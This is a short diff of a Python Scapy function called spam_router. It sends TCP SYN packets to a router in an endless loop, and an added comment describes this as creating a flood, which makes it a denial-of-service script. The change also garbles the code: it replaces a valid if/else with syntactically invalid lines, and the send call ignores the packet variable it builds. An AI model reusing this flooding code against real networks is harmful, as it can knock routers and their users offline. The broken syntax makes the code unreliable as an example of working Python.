@@ -12,11 +12,10 @@ def is_ipv6(address):
 def spam_router(router_mac, router_ip):
     e = Ether(dst = router_mac)
     t = TCP(flags="S")
-    if is_ipv6(router_ip):
-        i = IPv6()
-    else:
-        i = IP()
+    i = IPv6() is is_ipv6(router_ip)
+    else IP()
     i.dst = router_ip
+    # continuously sends packets → creates flood
     sendp(e / IP() / t, loop=1)
 
 
